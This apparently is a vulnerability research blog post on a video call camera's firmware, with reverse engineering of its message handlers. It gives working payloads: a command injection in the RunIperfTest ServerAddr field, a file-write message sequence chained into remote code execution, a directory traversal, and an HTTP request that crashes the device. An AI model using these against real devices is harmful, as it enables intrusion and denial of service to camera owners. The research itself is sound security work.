---
published: true
title: "🎥 [2] Finding Useless Integer Overflows + Some Useful Bugs"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Command Injection
  - Memory Corruption
  - Integer Overflow
  - Integer Underflow
tagline: "Now that we can look at the code in Ghidra and send messages to the camera to poke the handlers in the binary, lets try and find a few bugs! Hopefully we can find enough to get remote code execution."
excerpt: "Time to put my bug-hunting hat on!"
windowGradientStart: rgb(59, 59, 59)
windowGradientEnd: rgb(22, 22, 22)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(255, 255, 255)
maximizeButton: rgb(0, 0, 255)
closeButton: rgb(255, 0, 0)
---

# Mitigations

It is worth going over the mitigations we can see in this binary so we can have an idea on the impact of any bugs we find.

We can also run *checksec* on the binary and see what that spits out:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols    FORTIFY Fortified   Fortifiable FILE
Partial RELRO   Canary found      NX disabled   No PIE          RW-RPATH   No RUNPATH   No Symbols    No    0       22      App
```

Nice, no NX, would have been great if there wasn't a canary to contend with! As this binary is also not position independent, it will likely have the 'weak' ASLR that places shared objects and the stack at random-ish memory addresses rather than the full ASLR.

The main mitigation present on this binary that will limit the exploitability of a bug class is stack canaries, these should thwart stack buffer overflows if we come across any.

# Bugs

Lets go over the bugs I came across in the handlers - a lot of the attack surface is parsing of JSON payloads which are very string-heavy.

## Command Injection

In the handler for message type *0x3fc*, there is a *RunIperfTest* subcommand. One of the parameters, *ServerAddr* is vulnerable to command injection. This is a pretty simple command injection that can be used to execute commands of around *64* characters:

![cmd_injection.png](/assets/images/video_call_camera_p3/cmd_injection.png)

The only limitation is that an **iperf** directory that contains an **iperf** file must be present in the SD card (mounted as **/var/tmp/mmcblock0**) otherwise the handler will error out. That means that this command injection will likely only be useful with physical access.

![iperf_error.png](/assets/images/video_call_camera_p3/iperf_error.png)

There are also some weak checks for injection characters, but they don't check for the *&* symbol so we can just use that.

![character_checks.png](/assets/images/video_call_camera_p3/character_checks.png)

Here is a payload that should be sent in a message of type *0x3fc*:

```
-json
{
  "Name": "RunIperfTest",
  "SessionID": "0x0001869f",
  "RunIperfTest": {
    "ServerAddr": "0.0.0.0 && reboot",
    "ServerPort": 5001,
    "TestTime": 10,
    "Protocol": "TCP"
  }
}
```

## Binary Execution

The command injection I just mentioned isn't the most interesting thing about this handler. The reason it wants the **iperf/iperf** file on the SD card is because it actually tries to execute it! This means we can simply put together an *ash* script, or compile a binary to be executed when we make a request to that handler!

### Getting a Reverse Shell

With this newfound power, I immediately put together a *bash* script to copy a cross-compiled *gdbserver* and an **iperf** binary to the SD card. But before that, I put together a C program that would execute the *gdbserver* on the **App** process (so I can now remotely debug), and open up a 'reverse shell'-like interface. I did this because there weren't any easy programs like *telnet* or *netcat* available on this device.

Interestingly, the SD card seems to get wiped after a short period of time - but it stays long enough to execute the binaries loaded into it if you are quick. This means you have to rewrite the files to the SD card every time you want to debug with GDB.

![vanish.gif](/assets/images/video_call_camera_p3/vanish.gif)

Another interesting quirk is that there is a very stubborn watchdog (that I couldn't find a way around, I ended up learning to live with it :( ). If you attach gdb and don't continue the program, the **App** process is killed and restarted, as well as the **iperf** process.

Despite its quirks, we do now have a reverse shell on the device - albeit with the requirement of physical access:

![shell_output.png](/assets/images/video_call_camera_p3/shell_output.png)

## Assert Trigger

While investigating a bug in the message handler for type *0x41a*, I discovered another bug in the code by accident. Essentially the handler takes two shorts in the payload, and uses these to allocate memory. If you set both of the shorts to be something like *0x4000*, you can trigger an assert, crashing the program.

Here is the crash output:

```
Thread 42 "NetIPManager" received signal SIGABRT, Aborted.
0xb6f7934c in sigsetjmp () from target:/lib/ld-musl-arm.so.1

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0xb51621e4  →  0x00000000
$r2  : 0x0       
$r3  : 0x8       
$r4  : 0xb51621e4  →  0x00000000
$r5  : 0x0       
$r6  : 0xb6e521dc  →  "std::bad_alloc"
$r7  : 0xaf      
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x0       
$r11 : 0xf0ffffff
$r12 : 0xb6e71b68  →  0xb6f57c40  →  <abort+0> ldr r2,  [pc,  #160]	@ 0xb6f57ce8 <abort+168>
$sp  : 0xb51621d8  →  0x000000ee
$lr  : 0xb6f794d8  →  <raise+88> ldr r2,  [pc,  #48]	@ 0xb6f79510 <raise+144>
$pc  : 0xb6f7934c  →  <sigsetjmp+156> pop {r7,  pc}
$cpsr: [negative zero carry overflow interrupt fast thumb]

```

Obviously this is purely a DoS as we can't do anything once the assert has triggered.

## Integer Overflow

This is the main bug I was investigating in the *0x41a* handler - a nice little integer overflow. I mentioned in the previous section about the two shorts that are used for allocation, after doing some reverse-engineering, I determined that these are length/width values for some sort of screen-display functionality (I need to spend more time reverse engineering this as it could be quite cool!), and there is some strange colour decoding that occurs after.

However, for the purpose of this bug we don't need to worry about the encoder part of it, just those two shorts. The two shorts are passed into a function that is used for 'getting a packet', which just seems to be some sort of weird low-level struct a bunch of things use.

The amount of multiplications on controlled data immediately caught my eye, the second argument of the function is the size of the packet. We are able to overflow the calculation and have large width/length values, while creating a small allocation in the packet! This means we will not trigger the assert and will be given a valid packet with an associated (small) buffer.

![get_packet_int_overflow.png](/assets/images/video_call_camera_p3/get_packet_int_overflow.png)

I found the following numbers worked well: *0x5648* and *0x2f79*. Multiplied together and multiplied by *0x10* you end up with *0x100000080*, the *0x1* at the start will magically vanish due to the overflow, and thus the allocated packet will have a size of *0x80* while the sizes are large.

But what does this get us? Well I was hoping I could hit a call to **malloc** that uses the same operation, then copy a large buffer we control into it and win!

![malloc_overflow.png](/assets/images/video_call_camera_p3/malloc_overflow.png)

![maybe_memcpy_heap_overflow.png](/assets/images/video_call_camera_p3/maybe_memcpy_heap_overflow.png)

However, while testing, I quickly realised this bug might not be as feasible as I had initially hoped. I failed to notice a function between the integer overflow and the **malloc** that throws a spanner in the works.

![stupid_function.png](/assets/images/video_call_camera_p3/stupid_function.png)

![inside_stupid_function.png](/assets/images/video_call_camera_p3/inside_stupid_function.png)

Due to the loop and the use of the large length/width values, this function eventually tries to read outside of mapped memory, causing a crash before we can reach the **malloc** and consequent overflow!

*Note:* The end of the memory region is *0xb693f000*, which is observed in *r4*.

```
Thread 40 "NetIPManager" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 640.735]
0x000c1cfc in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0xb692e5e4  →  0xef947ae8
$r2  : 0x1       
$r3  : 0xb892e425
$r4  : 0xb693f000  →  0x00000000
$r5  : 0xfffffffe
$r6  : 0x009bd5a0  →  0x00509908  →  0x000c4e2c  →   ldr r3,  [pc,  #104]    @ 0xc4e9c
$r7  : 0xb692e424  →  0x00000000
$r8  : 0x0       
$r9  : 0x5648    
$r10 : 0x2f79    
$r11 : 0xf0ffffff
$r12 : 0xffffffff
$sp  : 0xb53122dc  →  0xb5312388  →  0x00000001
$lr  : 0xb693f000  →  0x00000000
$pc  : 0x000c1cfc  →   strheq r0,  [r4,  #14]
$cpsr: [negative ZERO carry overflow interrupt fast thumb]
```

Therefore, this bug is probably a dead end - but still cool to find an (almost useful) integer overflow in the wild!

## The Worlds Worst Directory Traversal

While looking through the handlers, I came across the handler for message type *0xdac*, which seemed to implement some functionality related to file management. It is a massive function with a bunch of stuff going on, so I went for a more dynamic approach based on some of the names it was searching for in the JSON.

Eventually, I discovered it can list files in certain directories, here is an example response for the contents of **/mnt/mtd/Flags**:

```
-json
{
  "Name": "OPFile",
  "OPFile": {
    "FileInfo": [
      {
        "FileName": "SoftPhotosensitiveFlag",
        "FileSize": 0
      },
      {
        "FileName": "NoIRCutReverseFlag",
        "FileSize": 0
      },
      {
        "FileName": "KeepDayNightModeFlag",
        "FileSize": 10
      }
    ],
    "Path": "/mnt/mtd/Flags"
  },
  "Ret": 100
}
```

There are limits to what can be accessed, the following directories (and their subdirectories) contents can be listed:
- **/mnt/data**
- **/mnt/mtd/Flags**
- **/mnt/mtd/NetFile**
- **/home**
- **/var/tmp/mmcblock0**

Here is the check that enforces those constraints:

![allowed_dir_check.png](/assets/images/video_call_camera_p3/allowed_dir_check.png)

To prevent listing of arbitrary directories, they use **strstr** and **find** to locate the character sequence **../** in the constructed file path:

![prevent_dir_traversal.png](/assets/images/video_call_camera_p3/prevent_dir_traversal.png)

*Note:* *0x527ecc* is the address of a **../** string, not sure what Ghidra is doing there.

Now here is the groundbreaking, revolutionary, critical, monumental discovery - you can put **..** at the end of the path and get the contents of the directories above the allowed directories. 

![the_end_is_near.png](/assets/images/video_call_camera_p3/the_end_is_near.png)

For example, here is **/mnt/mtd/Flags/..**:

```
-json
{
  "Name": "OPFile",
  "OPFile": {
    "FileInfo": [
      {
        "FileName": "Log",
        "FileSize": 0
      },
      {
        "FileName": "Config",
        "FileSize": 0
      },
      {
        "FileName": "Flags",
        "FileSize": 0
      },
      {
        "FileName": "wifi_list_log",
        "FileSize": 1885
      }
    ],
    "Path": "/mnt/mtd/Flags/.."
  },
  "Ret": 100
}
```

It impossible to go anywhere else without adding a **/** after the **..** so this is as useful as it is going to get!

## File Write

I reverse-engineered the code a bit more, and I figured out that a file can be written to those same directories as seen above (this isn't impacted by the directory traversal as a **/** character is placed after the path and before the filename). It also automatically creates subdirectories, which is handy!

The following message sequence will create a file called **pwned/pwned** on the SD card (**/var/tmp/mmcblock0**):

1. First send this with a message type of **0xdac**:

```
-json
{
  "SessionID": "0x0001869f",
  "OPFile": {
    "FileName": "pwned",
    "Path": "/var/tmp/mmcblock0/pwned",
    "FileSize": 5
  }
}
```

2. Next send a message of type **0xdae** with your file contents:

```
00000000  ff 01 00 00 9f 86 01 00 04 00 00 00 00 00 ae 0d   |................|
00000010  05 00 00 00 68 65 6c 6c 6f                        |....hello       |
```

Now the file should be on the SD card!

![pwned.png](/assets/images/video_call_camera_p3/pwned.png)

The only constraint with the write is that the file size must be < *0xc000* (or 49152 bytes).

![size_constraint.png](/assets/images/video_call_camera_p3/size_constraint.png)

As the comparison is unsigned, it also isn't possible to bypass this check by providing a negative filesize.

It isn't all doom and gloom however, as now as long as there is an SD card in the camera (which there is a pretty good chance of there being one) we can get code execution fully remotely! We can do this as we can simply write an **iperf/iperf** file on the SD card, and then trigger execution of that with our earlier finding!

# Bonus HTTP Bug

I had a poke around the HTTP server code, and while there wasn't really much attack surface there (some GET/POST/CGI processors that don't seem to do anything) I did come across a funny bug.

## Integer Underflow

While having a look at how the requests are parsed, I noticed it was looking for *"user="* and *"&password="* strings, and then doing a **strncpy** based on their positions. 

![integer_underflow.png](/assets/images/video_call_camera_p3/integer_underflow.png)

Based on the strings, the format is clearly expected to be *"user=username&password=password"*. However, there is nothing that enforces that order as the first argument of both of the **strstr** calls is identical.

The size of the copy is calculated by subtracting the address of the user string from the **strstr** from the address of the password string from the **strstr** call. 

This works fine when the user string is parsed first, but less so when the password string is first. If the orders are reversed, the size to be copied underflows, becoming a huge unsigned number. This goes into the **strncpy** call, and we get a massive copy into the **user_global** object.

There is also a check that makes sure the calculated copy size isn't huge, but the check is signed, so it doesn't account for negative integers that turn into huge numbers when they are unsigned as *-1* (*0xffffffff*) is less than *0x43*. They should have used an unsigned check for this to catch this edge case (or enforce ordering of the target strings like they did in other places). 

This bug is a really simple PoC:

```
-http
PUT &password=a&user=b HTTP/1.1
Host: 192.168.188.2
Connection: close
```

Unfortunately, this bug doesn't seem to be exploitable. Under the hood, the **strncpy** call is a wrapper around **stpncpy**, which calls **memset(_dest, 0, _n);** to clear the remainder of the output buffer if a null terminator is encountered. Unfortunately for us, that means we get a wild **memset** which sets the entire global region to *0*'s - eventually leading to a crash before we have a chance to do something useful.

Here is the crash (this particular segfault is caused by a null pointer dereference, likely because we bulldozed something with zeros):

```
Thread 49 "App" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 639.744]
0x001e6950 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0x0       
$r2  : 0x00b06190  →  0x00000000
$r3  : 0x00b06190  →  0x00000000
$r4  : 0x006692c4  →  0x00000000
$r5  : 0x00b05f50  →  0x00000000
$r6  : 0x006692a8  →  0x00000000
$r7  : 0x006189b0  →  0x001e67f8  →   push {r4,  r5,  r6,  r7,  r8,  lr}
$r8  : 0xb4ad0000  →  0x00000000
$r9  : 0xb6e4db48  →  0x00000000
$r10 : 0x0       
$r11 : 0xbeaebc44  →  0xb6006d65  →  0x00000000
$r12 : 0x005f0404  →  0xb6f4ea64  →  <times+0> push {r7,  lr}
$sp  : 0xb4af2c78  →  0x00000008
$lr  : 0x001dff08  →   cmn r0,  #1
$pc  : 0x001e6950  →   ldr r6,  [r0]
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
```

The crashes are also not consistent!

If this was not the case, we could simply overwrite the **http_recv_buffer** pointer which is stored near the buffer we overflow to any memory address and use this to get an arbitrary write!

# Conclusion

In conclusion, the attack surface available via this port is pretty huge and the camera has a bunch of features to explore. With this many handlers there are bound to be mistakes made, and we managed to spot a few. We also exploited the SD card file write and *RunIperfTest* issues to get fully remote code execution on the device, making debugging much easier!

It is a shame that the integer overflow/underflow issues aren't exploitable, but nothing wrong with a DoS (at least thats what I tell myself)!

![no_more_dos_plz.png](/assets/images/video_call_camera_p3/no_more_dos_plz.jpeg)